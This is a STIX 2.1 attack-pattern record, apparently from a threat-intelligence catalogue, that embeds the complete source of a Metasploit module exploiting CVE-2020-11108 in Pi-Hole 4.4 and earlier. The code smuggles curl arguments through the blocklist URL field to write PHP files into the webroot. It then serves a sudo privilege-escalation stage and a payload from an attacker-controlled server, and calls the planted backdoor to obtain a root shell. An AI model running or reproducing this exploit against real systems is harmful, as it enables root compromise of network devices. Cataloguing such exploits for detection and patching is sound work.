{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad81fe34-d8d9-4e98-aa2e-26c8b2993445",
    "created": "2024-08-14T17:14:46.555495Z",
    "modified": "2024-08-14T17:14:46.555499Z",
    "name": "Pi-Hole heisenbergCompensator Blocklist OS Command Execution",
    "description": " This exploits a command execution in Pi-Hole <= 4.4.  A new blocklist is added, and then an update is forced (gravity) to pull in the blocklist content.  PHP content is then written to a file within the webroot.  Phase 1 writes a sudo pihole command to launch teleporter effectively running a priv esc.  Phase 2 writes our payload to teleporter.php, overwriting the content.  Lastly, the phase 1 PHP file is called in the web root, which launches our payload in teleporter.php with root privileges.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/pihole_blocklist_exec.rb",
            "external_id": "pihole_blocklist_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://frichetten.com/blog/cve-2020-11108-pihole-rce/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/frichetten/CVE-2020-11108-PoC"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11108"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Pihole\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Pi-Hole heisenbergCompensator Blocklist OS Command Execution',\n        'Description' => %q{\n          This exploits a command execution in Pi-Hole <= 4.4.  A new blocklist is added, and then an\n          update is forced (gravity) to pull in the blocklist content.  PHP content is then written\n          to a file within the webroot.  Phase 1 writes a sudo pihole command to launch teleporter,\n          effectively running a priv esc.  Phase 2 writes our payload to teleporter.php, overwriting,\n          the content.  Lastly, the phase 1 PHP file is called in the web root, which launches\n          our payload in teleporter.php with root privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Nick Frichette' # original PoC, discovery\n        ],\n        'References' => [\n          ['EDB', '48443'],\n          ['EDB', '48442'],\n          ['URL', 'https://frichetten.com/blog/cve-2020-11108-pihole-rce/'],\n          ['URL', 'https://github.com/frichetten/CVE-2020-11108-PoC'],\n          ['CVE', '2020-11108']\n        ],\n        'Platform' => ['php'],\n        'Privileged' => true,\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2020-05-10',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n    # set the default port, and a URI that a user can set if the app isn't installed to the root\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptPort.new('SRVPORT', [true, 'Web Server Port, must be 80', 80]),\n        OptString.new('PASSWORD', [ false, 'Password for Pi-Hole interface', '']),\n        OptString.new('TARGETURI', [ true, 'The URI of the Pi-Hole Website', '/'])\n      ]\n    )\n  end\n\n  def setup\n    super\n    @stage = 0\n  end\n\n  def on_request_uri(cli, request)\n    if request.method == 'GET'\n      vprint_status('Received GET request.  Responding')\n      send_response(cli, rand_text_alphanumeric(5..10))\n      return\n    end\n\n    case @stage\n    when 0\n      vprint_status('(1/2) Sending priv esc trigger')\n      send_response(cli, %q{<?php shell_exec(\"sudo pihole -a -t\") ?>})\n      @stage += 1\n    when 1\n      vprint_status('(2/2) Sending root payload')\n      send_response(cli, payload.encoded)\n      @stage = 0\n    else\n      send_response(cli, rand_text_alphanumeric(5..10))\n      vprint_status(\"Server received default request for #{request.uri}\")\n    end\n  end\n\n  def check\n    begin\n      version, _web_version, _ftl = get_versions\n\n      if version.nil?\n        print_error(\"#{peer} - Could not connect to web service - no response or non-200 HTTP code\")\n        return Exploit::CheckCode::Unknown\n      end\n\n      if version && Rex::Version.new(version) <= Rex::Version.new('4.4')\n        vprint_good(\"Version Detected: #{version}\")\n        return CheckCode::Appears\n      else\n        vprint_bad(\"Version Detected: #{version}\")\n        return CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"#{peer} - Could not connect to the web service\")\n      return Exploit::CheckCode::Unknown\n    end\n    CheckCode::Safe\n  end\n\n  def add_blocklist(file, token)\n    # according to the writeup, if you have a port, the colon gets messed up in the encoding.\n    # also, looks like if you have a path (/file.php), it won't trigger either, or the / gets\n    # messed with.\n    data = {\n      'newuserlists' => %(http://#{datastore['SRVHOST']}#\" -o #{file} -d \"),\n      'field' => 'adlists',\n      'token' => token,\n      'submit' => 'saveupdate'\n    }\n\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'vars_get' => {\n        'tab' => 'blocklists'\n      },\n      'data' => data.to_query\n    )\n  end\n\n  def execute_shell(backdoor_name)\n    vprint_status('Popping root shell')\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'admin', 'scripts', 'pi-hole', 'php', backdoor_name),\n      'keep_cookies' => true\n    )\n  end\n\n  def exploit\n    if check != CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')\n    end\n\n    if datastore['SRVPORT'] != 80\n      fail_with(Failure::BadConfig, 'SRVPORT must be set to 80 for exploitation to be successful')\n    end\n\n    if datastore['SRVHOST'] == '0.0.0.0'\n      fail_with(Failure::BadConfig, 'SRVHOST must be set to an IP address (0.0.0.0 is invalid) for exploitation to be successful')\n    end\n\n    start_service({\n      'Uri' => {\n        'Proc' => proc do |cli, req|\n          on_request_uri(cli, req)\n        end,\n        'Path' => '/'\n      }\n    })\n\n    begin\n      # get cookie\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'admin', 'index.php'),\n        'keep_cookies' => true\n      )\n\n      # check if we need to login\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n        'keep_cookies' => true,\n        'vars_get' => {\n          'tab' => 'blocklists'\n        }\n      )\n\n      # check if we got hit by a login prompt\n      if res && res.body.include?('Sign in to start your session')\n        res = login(datastore['PASSWORD'])\n        fail_with(Failure::BadConfig, 'Incorrect Password') if res.nil?\n      end\n\n      token = get_token('blocklists')\n\n      if token.nil?\n        fail_with(Failure::UnexpectedReply, 'Unable to find token')\n      end\n      print_status(\"Using token: #{token}\")\n\n      # plant backdoor\n      backdoor_name = \"#{rand_text_alphanumeric 5..10}.php\"\n      register_file_for_cleanup backdoor_name\n      print_status('Adding backdoor reference')\n      add_blocklist(backdoor_name, token)\n\n      # update gravity\n      update_gravity\n      if @stage == 0\n        print_status('Sending 2nd gravity update request.')\n        update_gravity\n      end\n\n      # plant root upgrade\n      print_status('Adding root reference')\n      add_blocklist('teleporter.php', token)\n\n      # update gravity\n      update_gravity\n      if @stage == 1\n        print_status('Sending 2nd gravity update request.')\n        update_gravity\n      end\n\n      # pop shell\n      execute_shell(backdoor_name)\n      print_status(\"Blocklists must be removed manually from #{normalize_uri(target_uri.path, 'admin', 'settings.php')}?tab=blocklists\")\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-05-10",
    "x_mitre_platforms": [
        "['php']"
    ]
}